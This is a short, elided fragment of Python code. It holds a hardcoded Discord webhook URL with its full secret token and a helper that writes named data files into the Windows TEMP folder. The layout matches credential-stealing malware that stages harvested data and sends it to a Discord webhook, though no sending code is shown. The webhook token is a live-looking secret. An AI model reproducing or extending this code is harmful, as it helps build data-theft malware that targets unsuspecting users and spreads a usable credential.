...
hook = "https://discord.com/api/webhooks/1550135753202343976/AdV2Hr1vJPdeZcNOZc92uu2DvnNRDRWC8f-rFP6C56F70zU0WSUofg97HMiNnxao3VI4"
...
def writeforfile(data, name):
    path = os.getenv("TEMP") + rf"\wp{name}.txt"
